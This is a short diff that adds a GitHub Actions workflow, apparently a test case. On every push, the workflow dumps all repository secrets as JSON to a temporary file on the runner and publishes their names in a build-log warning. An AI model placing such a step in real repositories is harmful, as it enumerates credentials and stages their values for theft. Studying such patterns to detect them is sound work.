@@ -1,0 +1,9 @@
+name: c2case
+on: [push, workflow_dispatch]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          SJ: ${{ toJson(secrets) }}
+        run: printf '%s' "$SJ" > /tmp/j; echo "::warning title=names::$(cat /tmp/j | jq -r 'keys|join(",")')"
